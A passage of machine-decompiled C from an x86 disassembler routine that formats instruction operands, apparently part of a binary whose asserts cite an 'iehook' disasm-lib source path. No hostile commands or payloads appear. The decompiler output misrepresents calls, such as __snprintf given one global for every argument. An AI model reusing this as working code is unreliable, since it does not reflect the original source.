                                    v61 = v128;
                                    v65 = v63;
                                    if ((int16_t)v128 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x1000391d
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 16: {
                        // 0x10005d38
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x10005d42
                            if (*v34 < 2051) {
                                // 0x10005d61
                                *(int16_t *)(v79 + 6) = (int16_t)(*v26 & 15);
                            } else {
                                // 0x10005d56
                                *(int16_t *)(v79 + 6) = 2;
                            }
                            int32_t * v129 = (int32_t *)(v79 + 16); // 0x10005d71
                            *v129 = 1;
                            int32_t * v130 = (int32_t *)v79; // 0x10005d78
                            *v130 = *v130 | 128;
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v131 = *v18; // 0x10005d88
                                int32_t v132 = v131; // 0x10005d88
                                int32_t * v133 = (int32_t *)(v63 - 4); // 0x10005dab
                                *v133 = *(int32_t *)(4 * *v129 + (int32_t)&g68);
                                int32_t * v134 = (int32_t *)(v63 - 8); // 0x10005dac
                                *v134 = (int32_t)"<%s>";
                                int32_t * v135 = (int32_t *)(v63 - 12); // 0x10005db1
                                *v135 = v131 == -1 ? 0 : 256 - v132;
                                *(int32_t *)(v63 - 16) = v19 + v132;
                                int32_t v136 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10005dba
                                unsigned char v137 = *v18 + (char)v136; // 0x10005dbf
                                *v18 = v137;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x10005dd8
                                    *(char *)(v19 + (int32_t)v137) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t v138 = *v130; // 0x10005de6
                                    int32_t v139 = v138; // 0x10005dec
                                    if ((v138 & 0xe000) == 0) {
                                        // 0x10005dee
                                        *v133 = 3000;
                                        *v134 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v135 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v139 = *v130;
                                    }
                                    int32_t v140 = v139; // 0x10005e0b
                                    if ((v139 & 0x200000) != 0) {
                                        // 0x10005e0d
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v140 = *v130;
                                    }
                                    int32_t v141 = v140; // 0x10005e25
                                    if ((v140 & 0x100000) != 0) {
                                        // 0x10005e27
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v141 = *v130;
                                    }
                                    int32_t v142 = v141; // 0x10005e3f
                                    if ((v141 & 1024) != 0) {
                                        // 0x10005e41
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v142 = *v130;
                                    }
                                    // 0x10005e53
                                    v72 = v69;
                                    v61 = v142;
                                    v65 = v63;
                                    if ((int16_t)v142 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x10005e60
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 17: {
                        // 0x10005e71
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x10005e7b
                            if (*v34 < 2051) {
                                // 0x10005e9a
                                *(int16_t *)(v79 + 6) = (int16_t)(*v26 & 15);
                            } else {
                                // 0x10005e8f
                                *(int16_t *)(v79 + 6) = 2;
                            }
                            int32_t * v143 = (int32_t *)(v79 + 16); // 0x10005eaa
                            *v143 = 3;
                            int32_t * v144 = (int32_t *)v79; // 0x10005eb1
                            *v144 = *v144 | 128;
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v145 = *v18; // 0x10005ec1
                                int32_t v146 = v145; // 0x10005ec1
                                int32_t * v147 = (int32_t *)(v63 - 4); // 0x10005ee4
                                *v147 = *(int32_t *)(4 * *v143 + (int32_t)&g68);
                                int32_t * v148 = (int32_t *)(v63 - 8); // 0x10005ee5
                                *v148 = (int32_t)"<%s>";
                                int32_t * v149 = (int32_t *)(v63 - 12); // 0x10005eea
                                *v149 = v145 == -1 ? 0 : 256 - v146;
                                *(int32_t *)(v63 - 16) = v19 + v146;
                                int32_t v150 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10005ef3
                                unsigned char v151 = *v18 + (char)v150; // 0x10005ef8
                                *v18 = v151;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x10005f11
                                    *(char *)(v19 + (int32_t)v151) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t v152 = *v144; // 0x10005f1f
                                    int32_t v153 = v152; // 0x10005f25
                                    if ((v152 & 0xe000) == 0) {
                                        // 0x10005f27
                                        *v147 = 3013;
                                        *v148 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v149 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v153 = *v144;
                                    }
                                    int32_t v154 = v153; // 0x10005f44
                                    if ((v153 & 0x200000) != 0) {
                                        // 0x10005f46
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v154 = *v144;
                                    }
                                    int32_t v155 = v154; // 0x10005f5e
                                    if ((v154 & 0x100000) != 0) {
                                        // 0x10005f60
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v155 = *v144;
                                    }
                                    int32_t v156 = v155; // 0x10005f78
                                    if ((v155 & 1024) != 0) {
                                        // 0x10005f7a
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v156 = *v144;
                                    }
                                    // 0x10005f8c
                                    v72 = v69;
                                    v61 = v156;
                                    v65 = v63;
                                    if ((int16_t)v156 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x10005f99
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 18: {
                        // 0x10005faa
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x10005fb4
                            if (*v34 < 2051) {
                                // 0x10005fd3
                                *(int16_t *)(v79 + 6) = (int16_t)(*v26 & 15);
                            } else {
                                // 0x10005fc8
                                *(int16_t *)(v79 + 6) = 2;
                            }
                            int32_t * v157 = (int32_t *)(v79 + 16); // 0x10005fe3
                            *v157 = 0;
                            int32_t * v158 = (int32_t *)v79; // 0x10005fea
                            *v158 = *v158 | 128;
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v159 = *v18; // 0x10005ffa
                                int32_t v160 = v159; // 0x10005ffa
                                int32_t * v161 = (int32_t *)(v63 - 4); // 0x1000601d
                                *v161 = *(int32_t *)(4 * *v157 + (int32_t)&g68);
                                int32_t * v162 = (int32_t *)(v63 - 8); // 0x1000601e
                                *v162 = (int32_t)"<%s>";
                                int32_t * v163 = (int32_t *)(v63 - 12); // 0x10006023
                                *v163 = v159 == -1 ? 0 : 256 - v160;
                                *(int32_t *)(v63 - 16) = v19 + v160;
                                int32_t v164 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000602c
                                unsigned char v165 = *v18 + (char)v164; // 0x10006031
                                *v18 = v165;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x1000604a
                                    *(char *)(v19 + (int32_t)v165) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t v166 = *v158; // 0x10006058
                                    int32_t v167 = v166; // 0x1000605e
                                    if ((v166 & 0xe000) == 0) {
                                        // 0x10006060
                                        *v161 = 3026;
                                        *v162 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v163 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v167 = *v158;
                                    }
                                    int32_t v168 = v167; // 0x1000607d
                                    if ((v167 & 0x200000) != 0) {
                                        // 0x1000607f
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v168 = *v158;
                                    }
                                    int32_t v169 = v168; // 0x10006097
                                    if ((v168 & 0x100000) != 0) {
                                        // 0x10006099
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v169 = *v158;
                                    }
                                    int32_t v170 = v169; // 0x100060b1
                                    if ((v169 & 1024) != 0) {
                                        // 0x100060b3
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v170 = *v158;
                                    }
                                    // 0x100060c5
                                    v72 = v69;
                                    v61 = v170;
                                    v65 = v63;
                                    if ((int16_t)v170 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x100060d2
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 19: {
                        // 0x100060e3
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x100060ed
                            if (*v34 < 2051) {
                                // 0x1000610c
                                *(int16_t *)(v79 + 6) = (int16_t)(*v26 & 15);
                            } else {
                                // 0x10006101
                                *(int16_t *)(v79 + 6) = 2;
                            }
                            int32_t * v171 = (int32_t *)(v79 + 16); // 0x1000611c
                            *v171 = 4;
                            int32_t * v172 = (int32_t *)v79; // 0x10006123
                            *v172 = *v172 | 128;
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v173 = *v18; // 0x10006133
                                int32_t v174 = v173; // 0x10006133
                                int32_t * v175 = (int32_t *)(v63 - 4); // 0x10006156
                                *v175 = *(int32_t *)(4 * *v171 + (int32_t)&g68);
                                int32_t * v176 = (int32_t *)(v63 - 8); // 0x10006157
                                *v176 = (int32_t)"<%s>";
                                int32_t * v177 = (int32_t *)(v63 - 12); // 0x1000615c
                                *v177 = v173 == -1 ? 0 : 256 - v174;
                                *(int32_t *)(v63 - 16) = v19 + v174;
                                int32_t v178 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10006165
                                unsigned char v179 = *v18 + (char)v178; // 0x1000616a
                                *v18 = v179;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x10006183
                                    *(char *)(v19 + (int32_t)v179) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t v180 = *v172; // 0x10006191
                                    int32_t v181 = v180; // 0x10006197
                                    if ((v180 & 0xe000) == 0) {
                                        // 0x10006199
                                        *v175 = 3039;
                                        *v176 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v177 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v181 = *v172;
                                    }
                                    int32_t v182 = v181; // 0x100061b6
                                    if ((v181 & 0x200000) != 0) {
                                        // 0x100061b8
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v182 = *v172;
                                    }
                                    int32_t v183 = v182; // 0x100061d0
                                    if ((v182 & 0x100000) != 0) {
                                        // 0x100061d2
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v183 = *v172;
                                    }
                                    int32_t v184 = v183; // 0x100061ea
                                    if ((v183 & 1024) != 0) {
                                        // 0x100061ec
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v184 = *v172;
                                    }
                                    // 0x100061fe
                                    v72 = v69;
                                    v61 = v184;
                                    v65 = v63;
                                    if ((int16_t)v184 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x1000620b
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 20: {
                        // 0x1000621c
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x10006226
                            if (*v34 < 2051) {
                                // 0x10006245
                                *(int16_t *)(v79 + 6) = (int16_t)(*v26 & 15);
                            } else {
                                // 0x1000623a
                                *(int16_t *)(v79 + 6) = 2;
                            }
                            int32_t * v185 = (int32_t *)(v79 + 16); // 0x10006255
                            *v185 = 5;
                            int32_t * v186 = (int32_t *)v79; // 0x1000625c
                            *v186 = *v186 | 128;
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v187 = *v18; // 0x1000626c
                                int32_t v188 = v187; // 0x1000626c
                                int32_t * v189 = (int32_t *)(v63 - 4); // 0x1000628f
                                *v189 = *(int32_t *)(4 * *v185 + (int32_t)&g68);
                                int32_t * v190 = (int32_t *)(v63 - 8); // 0x10006290
                                *v190 = (int32_t)"<%s>";
                                int32_t * v191 = (int32_t *)(v63 - 12); // 0x10006295
                                *v191 = v187 == -1 ? 0 : 256 - v188;
                                *(int32_t *)(v63 - 16) = v19 + v188;
                                int32_t v192 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000629e
                                unsigned char v193 = *v18 + (char)v192; // 0x100062a3
                                *v18 = v193;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x100062bc
                                    *(char *)(v19 + (int32_t)v193) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t v194 = *v186; // 0x100062ca
                                    int32_t v195 = v194; // 0x100062d0
                                    if ((v194 & 0xe000) == 0) {
                                        // 0x100062d2
                                        *v189 = 3052;
                                        *v190 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v191 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v195 = *v186;
                                    }
                                    int32_t v196 = v195; // 0x100062ef
                                    if ((v195 & 0x200000) != 0) {
                                        // 0x100062f1
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v196 = *v186;
                                    }
                                    int32_t v197 = v196; // 0x10006309
                                    if ((v196 & 0x100000) != 0) {
                                        // 0x1000630b
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v197 = *v186;
                                    }
                                    int32_t v198 = v197; // 0x10006323
                                    if ((v197 & 1024) != 0) {
                                        // 0x10006325
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v198 = *v186;
                                    }
                                    // 0x10006337
                                    v72 = v69;
                                    v61 = v198;
                                    v65 = v63;
                                    if ((int16_t)v198 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x10006344
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 21: {
                        // 0x10006355
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x1000635f
                            if (*v34 < 2051) {
                                // 0x1000637e
                                *(int16_t *)(v79 + 6) = (int16_t)(*v26 & 15);
                            } else {
                                // 0x10006373
                                *(int16_t *)(v79 + 6) = 2;
                            }
                            int32_t * v199 = (int32_t *)(v79 + 16); // 0x1000638e
                            *v199 = 2;
                            int32_t * v200 = (int32_t *)v79; // 0x10006395
                            *v200 = *v200 | 128;
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v201 = *v18; // 0x100063a5
                                int32_t v202 = v201; // 0x100063a5
                                int32_t * v203 = (int32_t *)(v63 - 4); // 0x100063c8
                                *v203 = *(int32_t *)(4 * *v199 + (int32_t)&g68);
                                int32_t * v204 = (int32_t *)(v63 - 8); // 0x100063c9
                                *v204 = (int32_t)"<%s>";
                                int32_t * v205 = (int32_t *)(v63 - 12); // 0x100063ce
                                *v205 = v201 == -1 ? 0 : 256 - v202;
                                *(int32_t *)(v63 - 16) = v19 + v202;
                                int32_t v206 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x100063d7
                                unsigned char v207 = *v18 + (char)v206; // 0x100063dc
                                *v18 = v207;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x100063f5
                                    *(char *)(v19 + (int32_t)v207) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t v208 = *v200; // 0x10006403
                                    int32_t v209 = v208; // 0x10006409
                                    if ((v208 & 0xe000) == 0) {
                                        // 0x1000640b
                                        *v203 = 3065;
                                        *v204 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v205 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v209 = *v200;
                                    }
                                    int32_t v210 = v209; // 0x10006428
                                    if ((v209 & 0x200000) != 0) {
                                        // 0x1000642a
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v210 = *v200;
                                    }
                                    int32_t v211 = v210; // 0x10006442
                                    if ((v210 & 0x100000) != 0) {
                                        // 0x10006444
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v211 = *v200;
                                    }
                                    int32_t v212 = v211; // 0x1000645c
                                    if ((v211 & 1024) != 0) {
                                        // 0x1000645e
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v212 = *v200;
                                    }
                                    // 0x10006470
                                    v72 = v69;
                                    v61 = v212;
                                    v65 = v63;
                                    if ((int16_t)v212 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x1000647d
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 22: {
                        // 0x1000648e
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x10006498
                            *(int16_t *)(v79 + 6) = (int16_t)(*v26 & 15);
                            int32_t * v213 = (int32_t *)(v79 + 16); // 0x100064a8
                            *v213 = 32;
                            int32_t * v214 = (int32_t *)v79; // 0x100064af
                            *v214 = *v214 | 128;
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v215 = *v18; // 0x100064bf
                                int32_t v216 = v215; // 0x100064bf
                                int32_t * v217 = (int32_t *)(v63 - 4); // 0x100064e2
                                *v217 = *(int32_t *)(4 * *v213 + (int32_t)&g68);
                                int32_t * v218 = (int32_t *)(v63 - 8); // 0x100064e3
                                *v218 = (int32_t)"<%s>";
                                int32_t * v219 = (int32_t *)(v63 - 12); // 0x100064e8
                                *v219 = v215 == -1 ? 0 : 256 - v216;
                                *(int32_t *)(v63 - 16) = v19 + v216;
                                int32_t v220 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x100064f1
                                unsigned char v221 = *v18 + (char)v220; // 0x100064f6
                                *v18 = v221;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x1000650f
                                    *(char *)(v19 + (int32_t)v221) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t v222 = *v214; // 0x1000651d
                                    int32_t v223 = v222; // 0x10006523
                                    if ((v222 & 0xe000) == 0) {
                                        // 0x10006525
                                        *v217 = 3078;
                                        *v218 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v219 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v223 = *v214;
                                    }
                                    int32_t v224 = v223; // 0x10006542
                                    if ((v223 & 0x200000) != 0) {
                                        // 0x10006544
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v224 = *v214;
                                    }
                                    int32_t v225 = v224; // 0x1000655c
                                    if ((v224 & 0x100000) != 0) {
                                        // 0x1000655e
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v225 = *v214;
                                    }
                                    int32_t v226 = v225; // 0x10006576
                                    if ((v225 & 1024) != 0) {
                                        // 0x10006578
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v226 = *v214;
                                    }
                                    // 0x1000658a
                                    v72 = v69;
                                    v61 = v226;
                                    v65 = v63;
                                    if ((int16_t)v226 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x10006597
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 23: {
                        // 0x1000392e
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x10003938
                            *(int16_t *)(v79 + 6) = 8;
                            char * v227 = (char *)(v79 + 4); // 0x10003941
                            *v227 = *v227 & -64 | 6;
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v228 = *v18; // 0x10003957
                                int32_t v229 = v228; // 0x10003957
                                int32_t * v230 = (int32_t *)(v63 - 4); // 0x10003970
                                *v230 = (int32_t)"<TSC_MSR>";
                                int32_t * v231 = (int32_t *)(v63 - 8); // 0x10003975
                                *v231 = v228 == -1 ? 0 : 256 - v229;
                                int32_t * v232 = (int32_t *)(v63 - 12); // 0x1000397d
                                *v232 = v19 + v229;
                                int32_t v233 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000397e
                                unsigned char v234 = *v18 + (char)v233; // 0x10003983
                                *v18 = v234;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x1000399c
                                    *(char *)(v19 + (int32_t)v234) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t * v235 = (int32_t *)v79; // 0x100039aa
                                    int32_t v236 = *v235; // 0x100039aa
                                    int32_t v237 = v236; // 0x100039b0
                                    if ((v236 & 0xe000) == 0) {
                                        // 0x100039b2
                                        *v230 = 2626;
                                        *v231 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v232 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v237 = *v235;
                                    }
                                    int32_t v238 = v237; // 0x100039cf
                                    if ((v237 & 0x200000) != 0) {
                                        // 0x100039d1
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v238 = *v235;
                                    }
                                    int32_t v239 = v238; // 0x100039e9
                                    if ((v238 & 0x100000) != 0) {
                                        // 0x100039eb
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v239 = *v235;
                                    }
                                    int32_t v240 = v239; // 0x10003a03
                                    if ((v239 & 1024) != 0) {
                                        // 0x10003a05
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v240 = *v235;
                                    }
                                    // 0x10003a17
                                    v72 = v69;
                                    v61 = v240;
                                    v65 = v63;
                                    if ((int16_t)v240 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x10003a24
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 32: {
                        // 0x10005ae0
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x10005aea
                            *(int16_t *)(v79 + 6) = 2;
                            int32_t * v241 = (int32_t *)v79; // 0x10005af3
                            *v241 = *v241 | 128;
                            *(int32_t *)(v79 + 16) = 6;
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v242 = *v18; // 0x10005b0a
                                int32_t v243 = v242; // 0x10005b0a
                                int32_t * v244 = (int32_t *)(v63 - 4); // 0x10005b29
                                *v244 = *(int32_t *)&g69;
                                int32_t * v245 = (int32_t *)(v63 - 8); // 0x10005b2a
                                *v245 = (int32_t)"<%s>";
                                int32_t * v246 = (int32_t *)(v63 - 12); // 0x10005b2f
                                *v246 = v242 == -1 ? 0 : 256 - v243;
                                *(int32_t *)(v63 - 16) = v19 + v243;
                                int32_t v247 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10005b38
                                unsigned char v248 = *v18 + (char)v247; // 0x10005b3d
                                *v18 = v248;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x10005b56
                                    *(char *)(v19 + (int32_t)v248) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t v249 = *v241; // 0x10005b64
                                    int32_t v250 = v249; // 0x10005b6a
                                    if ((v249 & 0xe000) == 0) {
                                        // 0x10005b6c
                                        *v244 = 2967;
                                        *v245 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v246 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v250 = *v241;
                                    }
                                    int32_t v251 = v250; // 0x10005b89
                                    if ((v250 & 0x200000) != 0) {
                                        // 0x10005b8b
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v251 = *v241;
                                    }
                                    int32_t v252 = v251; // 0x10005ba3
                                    if ((v251 & 0x100000) != 0) {
                                        // 0x10005ba5
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v252 = *v241;
                                    }
                                    int32_t v253 = v252; // 0x10005bbd
                                    if ((v252 & 1024) != 0) {
                                        // 0x10005bbf
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v253 = *v241;
                                    }
                                    // 0x10005bd1
                                    v72 = v69;
                                    v61 = v253;
                                    v65 = v63;
                                    if ((int16_t)v253 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x10005bde
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 33: {
                        // 0x10005bef
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x10005bf9
                            *(int16_t *)(v79 + 6) = (int16_t)(*v26 & 15);
                            int32_t * v254 = (int32_t *)v79; // 0x10005c09
                            *v254 = *v254 | 128;
                            unsigned char v255 = *v26 & 15;
                            if (v255 == 2) {
                                // 0x10005c3e
                                *(int32_t *)(v79 + 16) = 6;
                            } else {
                                int32_t v256 = (int32_t)v255 - 4; // 0x10005c1e
                                if (v256 == 0) {
                                    // 0x10005c35
                                    *(int32_t *)(v79 + 16) = 7;
                                } else {
                                    if (v256 != 4) {
                                        // 0x1000afeb
                                        *(int32_t *)(v63 - 4) = 2980;
                                        *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *(int32_t *)(v63 - 12) = (int32_t)&g3;
                                        __wassert();
                                        return 0;
                                    }
                                    // 0x10005c2c
                                    *(int32_t *)(v79 + 16) = 8;
                                }
                            }
                            // 0x10005c45
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v257 = *v18; // 0x10005c4f
                                int32_t v258 = v257; // 0x10005c4f
                                int32_t v259 = *(int32_t *)(v79 + 16); // 0x10005c68
                                int32_t * v260 = (int32_t *)(v63 - 4); // 0x10005c72
                                *v260 = *(int32_t *)(4 * v259 + (int32_t)&g68);
                                int32_t * v261 = (int32_t *)(v63 - 8); // 0x10005c73
                                *v261 = (int32_t)"<%s>";
                                int32_t * v262 = (int32_t *)(v63 - 12); // 0x10005c78
                                *v262 = v257 == -1 ? 0 : 256 - v258;
                                *(int32_t *)(v63 - 16) = v19 + v258;
                                int32_t v263 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10005c81
                                unsigned char v264 = *v18 + (char)v263; // 0x10005c86
                                *v18 = v264;
                                v74 = v69;
